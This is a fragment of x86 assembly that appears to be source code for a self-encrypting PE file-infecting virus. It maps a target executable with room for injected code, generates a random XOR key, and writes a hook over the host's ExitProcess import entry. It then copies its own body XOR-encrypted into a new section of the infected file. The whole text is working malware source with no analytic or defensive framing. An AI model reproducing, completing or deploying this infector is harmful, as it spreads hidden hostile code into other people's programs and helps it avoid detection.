; CREATE NEW SECTION 
; CREATE_FILE_MAPPING WITH SIZE + INJECT SIZE
push	NULL
mov	eax, [DELTA PointerToRawData]
add	eax, [DELTA SizeOfRawData]
push	eax ; New size
push	0
push	PAGE_READWRITE
push	NULL
PVDELTA	PeFile
call	[DELTA pCreateFileMapping]
cmp	eax, 0
je	errorCreateMapping
mov	[DELTA PeMapObject], eax

; MAP_VIEW_OF_FILE
push	0
push	0
push	0
mov	eax, FILE_MAP_READ
or	eax, FILE_MAP_WRITE
push	eax
PVDELTA	PeMapObject
call	[DELTA pMapViewOfFile]
cmp	eax, 0
je	errorMapFile
mov	[DELTA PeFileMap], eax


; INFOS
PATCH_DECRYPT_SIZE	= 22
PATCH_SIZE		= PATCH_DECRYPT_SIZE + 5
PATCHER_SIZE		= 47
DECRYPTER_SIZE		= 25


; CREATING ENCRYPTER
mov	eax, 255 ; Maximum xoring
call	random
; Set same byte for all 4 bytes of EDX
rol	eax, 8
mov	al, ah
rol	eax, 8
mov	al, ah
rol	eax, 8
mov	al, ah
mov	[DELTA XorCrypt], eax


; PATCH HOOK EXIT PROCESS
mov	edi, offset hookExitProcess
add	edi, ebp
mov	eax, 0B8h ; mov eax, imm32
stosb
mov	eax, [DELTA BaseImage]
mov	edx, [DELTA VAKernelIAT]
add	eax, edx
stosd
mov	eax, 0B9h ; mov ecx, imm32
stosb
mov	eax, [DELTA OffsetExitProcess]
mov	edx, [DELTA BaseImage]
add	eax, edx
stosd
mov	eax, 0008Bh ; mov eax, [eax]
stosw
mov	eax, 0C803h ; add ecx, eax
stosw
mov	eax, 001C7h ; mov [ecx], imm32
stosw
mov	eax, 042424242h ; Hook Function
stosd



; INSERTING NEW SECTION - OPCODE COPY WITH ENCRYPTION
mov	ecx, endInject - endPatcher
mov	edi, [DELTA PeFileMap] ; Destination bytes
add	edi, [DELTA PointerToRawData]
add	edi, DECRYPTER_SIZE + PATCHER_SIZE
mov	esi, endPatcher ; Source bytes
add	esi, ebp
createNewSection:
lodsb
xor	eax, [DELTA XorCrypt] ; Encrypt
stosb
loop	createNewSection
